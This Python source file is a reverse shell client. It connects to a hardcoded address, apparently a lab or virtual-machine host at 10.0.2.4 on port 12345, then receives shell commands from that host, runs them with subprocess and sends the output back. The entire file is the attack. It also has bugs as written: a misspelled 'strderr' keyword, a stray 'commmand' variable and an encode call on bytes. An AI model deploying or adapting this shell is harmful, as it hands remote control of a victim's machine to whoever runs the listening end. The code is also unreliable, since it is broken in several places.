import socket
import os
import subprocess

HOST = "10.0.2.4"
PORT = 12345
BUFFER = 1024
# client
def main():
    # HOST = raw_input("give me a host to connect to :3: ") # for python 2.7.5
    print("running client side with: " + HOST + " and " + str(PORT))

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    print("attempting to connect")
    client.connect((HOST, PORT))
    # send something
    while True: 
        # something = raw_input("what do you wnant to send to this not evil thingy (enter to exit): ")
        # if something == "":
        #     break
        # data = raw_input("input a command: ")
        
        command = client.recv(BUFFER).decode("UTF-8")
        commmand = command.split(" ")
         # EXDCUTING COMMAND
        # getoutput returns output stdout and stderr of executing cmd in a shell
        output = subprocess.check_output(command, strderr=subprocess.STDOUT)
        client.send(output.encode())
        
    client.close()

if __name__ == "__main__":
    main()